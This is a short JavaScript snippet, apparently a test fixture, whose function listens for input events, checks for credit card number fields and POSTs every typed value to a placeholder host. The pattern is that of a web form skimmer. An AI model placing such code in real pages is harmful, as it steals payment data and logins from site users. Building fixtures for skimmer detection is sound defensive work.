function inspect(document, fetch) {
  document.addEventListener('input', ev => {
    ev.target.matches('input[autocomplete="cc-number"]');
  });
  document.addEventListener('input', ev => {
    fetch('https://example.invalid/fixture', {
      method: 'POST',
      body: JSON.stringify({value: ev.target.value}),
    });
  });
}
